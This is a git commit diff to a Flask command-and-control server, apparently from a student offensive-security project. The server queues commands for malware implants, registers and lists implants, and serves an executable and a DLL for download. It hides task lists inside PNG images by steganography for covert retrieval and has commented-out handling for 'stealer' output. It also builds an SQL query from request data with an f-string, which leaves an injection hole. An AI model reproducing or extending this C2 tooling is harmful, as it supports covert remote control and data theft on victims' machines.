1b3a6ae093af55b5675b7199a75187298b71da23
Ingi-Hong <ingihong@bu.edu>
2022-12-16 12:09:25 -0500

    steg fixed

--- C2/app.py
+++ C2/app.py
@@ -4,7 +4,7 @@ import os
 from datetime import datetime
 
 import config
-import Steganography
+import SteganographyFixed
 import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
@@ -72,14 +72,18 @@ def handle_test():
 def home():
     return "<div>Hi</div>", 200
 
+
 @app.route("/lib")
 def handle_lib():
     return send_from_directory(directory="./", filename="libpng16.dll")
+
 
 @app.route("/steg")
 def handle_steg():
     return send_from_directory(directory="./", filename="Steganography.exe")
 # api endpoint to queue a command
+
+
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
 def handle_execute():
@@ -92,8 +96,9 @@ def handle_execute():
         status = "untouched"
         current_user = get_jwt_identity()
 
-        columns = ['target_implant_id', 'command', 'created_on', 'status', 'creator']
-        
+        columns = ['target_implant_id', 'command',
+                   'created_on', 'status', 'creator']
+
         data = target_implant_id, command, created_on, status, current_user
         print("About to send query")
         print(data)
@@ -108,6 +113,8 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
+
+
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -126,8 +133,9 @@ def get_qcommands():
         query = "UPDATE task_queue SET status=%s WHERE id=%s"
         tools.executeGenericVar(query, ['executing', id])
 
-        img = Steganography.iio.imread("doge.png")
-        Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp, default=str)))
+        img = SteganographyFixed.iio.imread("doge.png")
+        SteganographyFixed.iio.imwrite("doge_encoded.png", SteganographyFixed.encode(
+            img, json.dumps(db_resp, default=str)))
         response = send_file('doge_encoded.png', mimetype='image/png')
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -136,8 +144,9 @@ def get_qcommands():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-
 # List all commands for a particular implant
+
+
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -152,7 +161,7 @@ def get_commands():
         print(f"this is the db response: {db_resp}")
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
-   
+
         response = db_resp
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -162,6 +171,8 @@ def get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_untouched", methods=["POST"])
 def get_untouched():
     data = request.json
@@ -177,6 +188,8 @@ def get_untouched():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executing", methods=["POST"])
 def get_executing():
     data = request.json
@@ -192,6 +205,8 @@ def get_executing():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executed", methods=["POST"])
 def get_executed():
     data = request.json
@@ -206,7 +221,9 @@ def get_executed():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# Register an implant, on the implant side TODO 
+# Register an implant, on the implant side TODO
+
+
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -231,6 +248,8 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
+
+
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -265,12 +284,12 @@ def handle_response():
         # command = data['command']
 
         # print("checking command: " + command)
-        # if "stealer" in command: 
-        #     # TODO call Wyatt's function 
+        # if "stealer" in command:
+        #     # TODO call Wyatt's function
         #     response_data = WyattWonderland.parsejson(response_data)
-            
+
         # print("Querying now")
-        # # DUMP BACK INTO TASK_QUEUE 
+        # # DUMP BACK INTO TASK_QUEUE
         # query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"
 
         print("succesful")
@@ -290,7 +309,8 @@ def testThis():
     try:
         file = "file not accesed"
         file = request.files['file']
-        message = Steganography.decode(Steganography.iio.imread(file))
+        message = SteganographyFixed.decode(
+            SteganographyFixed.iio.imread(file))
         print(message)
         return 'yer', 200, {'Access-Control-Allow-Origin': '*'}
     except Exception as error:
@@ -298,6 +318,8 @@ def testThis():
         return error, 401, {'Access-Control-Allow-Origin': '*'}
 
 # Gets log history of a particular implant
+
+
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
@@ -305,7 +327,8 @@ def get_history():
         data = request.json
         id = data['id']
 
-        all = tools.executeSelectQuery(f"SELECT * FROM task_queue WHERE target_implant_id={id}")
+        all = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id}")
         print(all)
 
         pending = tools.executeSelectQuery(
@@ -323,12 +346,15 @@ def get_history():
         print(f"this is executing responses: {executing}")
         # "success": x[-3]
         # [(2, 1, 'implant', datetime.datetime(2022, 12, 1, 16, 58, 44, 674016), 'untouched', responseData, success, recieved, creator)
-        pending = [{"sender": "user", "creator":x[-1], "time":x[3], "command":x[2] } for x in pending]
-        combined = [{"sender": "user", "creator":x[-1], "time":x[3], "command":x[2] } for x in executed]
-        combined += [{"sender": "implant", "time":x[-2], "command":x[2], "response":x[-4]} for x in executed] 
+        pending = [{"sender": "user", "creator": x[-1],
+                    "time":x[3], "command":x[2]} for x in pending]
+        combined = [{"sender": "user", "creator": x[-1],
+                     "time":x[3], "command":x[2]} for x in executed]
+        combined += [{"sender": "implant", "time": x[-2],
+                      "command":x[2], "response":x[-4]} for x in executed]
         combined += pending
 
-        sortedList = sorted(combined, key=lambda x: x['time']) 
+        sortedList = sorted(combined, key=lambda x: x['time'])
 
         print(f"Sorted List: {sortedList}")
 
@@ -336,7 +362,6 @@ def get_history():
     except Exception as e:
         print(e)
         return e, {'Access-Control-Allow-Origin': '*'}
-
 
     # Construct a linear history of commands -> responses
 
